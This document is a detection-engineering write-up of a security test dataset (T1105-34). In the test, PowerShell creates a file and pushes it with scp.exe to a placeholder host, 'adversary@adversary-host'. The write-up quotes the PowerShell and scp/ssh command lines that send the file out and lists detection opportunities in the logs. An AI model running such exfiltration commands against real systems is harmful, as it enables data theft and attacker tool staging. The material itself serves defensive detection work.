# T1105-34: Ingress Tool Transfer — Windows push file using scp.exe

## Technique Context

T1105 Ingress Tool Transfer represents adversaries' ability to transfer tools and files from external systems into compromised environments. This technique is fundamental to attack progression, enabling threat actors to stage additional payloads, exfiltration tools, or persistence mechanisms. The detection community focuses heavily on monitoring for unusual network connections, file transfers via uncommon protocols, and the use of living-off-the-land binaries (LOLBins) for data movement.

This specific test demonstrates using Windows' built-in `scp.exe` (part of OpenSSH client) to push files to a remote system. While `scp` is legitimate infrastructure, adversaries abuse it for covert data exfiltration or tool staging. The technique is particularly concerning because it leverages trusted, signed binaries and established SSH protocols that may blend with legitimate administrative traffic.

## What This Dataset Contains

The dataset captures a complete execution chain starting with PowerShell-based file preparation followed by SCP transfer attempts:

**Process Chain**: Security event 4688 shows the full command line: `"powershell.exe" & {# Check if the folder exists, create it if it doesn't $folderPath = \"C:\temp\" if (-Not (Test-Path -Path $folderPath)) { New-Item -Path $folderPath -ItemType Directory } # Create the file $filePath = Join-Path -Path $folderPath -ChildPath \"T1105.txt\" New-Item -Path $filePath -ItemType File -Force Write-Output \"File created: $filePath\" # Attack command scp.exe C:\temp\T1105.txt adversary@adversary-host:/tmp/}`

**File Operations**: Sysmon EID 11 records the target file creation at `C:\temp\T1105.txt` by PowerShell process 9112.

**Network Tool Execution**: Security 4688 captures `scp.exe` execution with command line `"C:\Windows\System32\OpenSSH\scp.exe" C:\temp\T1105.txt adversary@adversary-host:/tmp/` and subsequent SSH client spawning with `"C:\Windows\System32\OpenSSH\ssh.exe" -x -oPermitLocalCommand=no -oClearAllForwardings=yes -oRemoteCommand=none -oRequestTTY=no -oForwardAgent=no -l adversary -s -- adversary-host sftp`.

**Failed Connection**: Both `scp.exe` and `ssh.exe` processes exit with status `0xFF` (255), indicating connection failure to the non-existent target host.

**PowerShell Telemetry**: EID 4103/4104 events capture detailed PowerShell cmdlet invocations including `Test-Path`, `Join-Path`, `New-Item`, and `Write-Output` with their specific parameters.

## What This Dataset Does Not Contain

The dataset lacks successful network connections due to the non-existent target host `adversary-host`. No Sysmon EID 3 network connections are recorded from the SSH/SCP processes, only unrelated mDNS traffic from `svchost.exe`. This means the dataset demonstrates the attempt telemetry but not the actual data exfiltration network behavior that would occur in real attacks.

The Sysmon ProcessCreate events for the initial PowerShell processes are missing because the sysmon-modular config uses include-mode filtering that doesn't capture standard PowerShell execution patterns. However, Security 4688 events provide complete coverage of all process creations with full command lines.

The dataset also doesn't capture any DNS resolution attempts for `adversary-host`, suggesting the SSH client fails before attempting hostname resolution.

## Assessment

This dataset provides excellent detection engineering value for T1105 implementations using SCP. The combination of Security 4688 process creation events and Sysmon file creation events delivers comprehensive visibility into the attack pattern. The PowerShell script block logging (EID 4104) captures the complete attack script, while process command lines show the exact SCP syntax used.

The failed connection actually enhances the dataset's utility by demonstrating how detection logic should focus on the attempt rather than success - many real-world detections need to catch reconnaissance and staging attempts before they succeed. The clear process lineage from PowerShell to SCP to SSH provides multiple detection points across the attack chain.

## Detection Opportunities Present in This Data

1. **SCP Process Creation with External Targets**: Security EID 4688 showing `scp.exe` with external hostnames in command line arguments, especially when spawned from scripting engines like PowerShell.

2. **SSH/SCP Process Exit Code Monitoring**: Processes exiting with status 255 (0xFF) indicating failed connections to potentially malicious or non-existent infrastructure.

3. **PowerShell Script Block Analysis**: EID 4104 capturing file creation followed by network tool execution in the same script context, indicating potential data staging and exfiltration workflows.

4. **File Creation to SCP Correlation**: Correlating Sysmon EID 11 file creation events with subsequent SCP process execution targeting the same files within short time windows.

5. **Parent-Child Process Relationships**: PowerShell spawning SSH client tools (scp.exe, ssh.exe) with SFTP protocol flags, indicating programmatic rather than interactive usage.

6. **PowerShell Cmdlet Sequence Detection**: EID 4103 events showing file system manipulation cmdlets (`New-Item`, `Test-Path`, `Join-Path`) followed by external process execution within the same PowerShell session.

7. **OpenSSH Client Parameter Analysis**: SSH command lines containing security-focused parameters like `-oPermitLocalCommand=no` and `-oForwardAgent=no` that may indicate automated tooling rather than human operators.
